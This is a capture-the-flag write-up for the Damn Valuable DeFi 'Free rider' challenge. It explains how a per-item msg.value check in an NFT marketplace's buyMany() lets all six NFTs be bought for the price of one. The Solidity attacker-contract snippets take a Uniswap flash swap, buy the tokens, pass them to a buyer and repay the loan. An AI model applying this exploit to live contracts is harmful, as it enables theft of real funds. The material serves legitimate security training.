## Free rider

### Challenge description

> A new marketplace of Damn Valuable NFTs has been released! There's been an initial mint of 6 NFTs, which are available for sale in the marketplace. Each one at 15 ETH.
>
> A buyer has shared with you a secret alpha: the marketplace is vulnerable and all tokens can be taken. Yet the buyer doesn't know how to do it. So it's offering a payout of 45 ETH for whoever is willing to take the NFTs out and send them their way.
>
> You want to build some rep with this buyer, so you've agreed with the plan.
>
> Sadly you only have 0.5 ETH in balance. If only there was a place where you could get free ETH, at least for an instant. 

### Solution

The FreeRiderNFTMarketplace contract has a vulnerability in `_buyOne()` where `msg.value` is checked and compared to the price of the NFTs which we want to bulk buy through `buyMany()`. However, the comparison is *individually* made for *each* NFT we try to purchase with `buyMany()`. This opens up the possibility of buying *all* NFTs we order for the price of the *highest* one alone, making all others free. 

In this case, we can exploit this by sending 15 ether, which ends up covering for *all* of them (as opposed to 15 * 6 = 90 ether), thereby netting us +75 ether.

To exploit this, we first need to code a contract, as it's the only way to take the flash loan from uniswap.

The attacker contract should have a function which calls the `swap()` function and routes its internal `uniswapV2Call()` call to a function inside of our contract, so we must override the `uniswapV2Call()` function imported from the IUniswapV2Callee interface.

In my case, since we only need WETH, I made the `flashSwap()` function only take amounts of WETH in count:

```solidity
function flashSwap(uint256 _amount) external {
    // we want to specifically borrow weth
    uint256 amount0 = pair.token0() == weth ? _amount : 0;
    uint256 amount1 = pair.token1() == weth ? _amount : 0;
    
    // encoded data for `swap` to understand it's a flashloan and not just a swap
    bytes memory data = abi.encode(weth, _amount);
    pair.swap(amount0, amount1, address(this), data);
}
```

Then within the `uniswapV2Call()` function we have already received the tokens, so we can now do stuff with them, in this case, the first thing we need to do is convert the WETH to ETH, as the marketplace only accepts ETH:

```solidity
IERC20(weth).approve(weth, type(uint256).max);
weth.functionCall(abi.encodeWithSignature("withdraw(uint256)", amount));
```

All we need to take is 15 ether, as it's all needed to take all the NFTs from the marketplace.

After withdrawing the ether, I create an array of integers with all the token IDs for the NFTs we want to buy. I defined this function to generate a dynamic array of integers with values from 0 to `size`:

```solidity
function arrayOfIntegers(uint256 size) private returns (uint256[] memory) {
    uint256[] memory uintArray = new uint256[](size);
    for (uint256 i = 0; i < size; i++) {
        uintArray[i] = i;
    }
    return uintArray;
}
```

I'm sure there's much better ways to do this, but here we are. Anyway, With this function I generate the array:

```solidity
uint256 amountOfOffers = marketplace.amountOfOffers();
uint256[] memory tokenIdsArray = arrayOfIntegers(amountOfOffers);
```

Which must be passed to the marketplace's `buyMany()` function along with the 15 ether:

```solidity
marketplace.buyMany{value: amount}(tokenIdsArray);
```

Then the NFTs must be transferred to the buyer, so we loop over token IDs and perform a `safeTransferFrom()`, I coded a short function for this to keep `uniswapV2Call()` cleaner:

```solidity
function bulkSafeTransferNFT(uint256[] memory tokenIds) private {
    for (uint256 i = 0; i < tokenIds.length; i++) {
        nft.safeTransferFrom(address(this), address(buyer), tokenIds[i]);
    }
}
```

Then I call this function to send the corresponding purchased tokens to the buyer, so the attacker can get the payment for them:

```solidity
bulkSafeTransferNFT(tokenIdsArray);
```

Then the amount to repay has to be computed, as there's a 0.3% fee on top of the loan taken from Uniswap:

```solidity
uint256 amountToRepay = amount + (((amount*3)/997)+1);
```

Then the loan can be repayed depositing the ETH to get WETH and transferring the WETH back into the pair address:

```solidity
weth.functionCallWithValue(abi.encodeWithSignature("deposit()"), amountToRepay);
IERC20(weth).transfer(address(pair), amountToRepay);
```

Then finally I call a `recoverETH()` function I coded into the contract to obtain the net profits from the marketplace exploit:

```solidity
function recoverETH() external {
    owner.sendValue(address(this).balance);
}
```

Where `owner` is the attacker address.

It's important to note that there should be a `onERC721Received()` function which allows the contract to receive the NFTs through the marketplace's safe transfer call.

Also, the contract needs to have a fallback function to receive Ether, as the marketplace will forward some when the purchases are made.
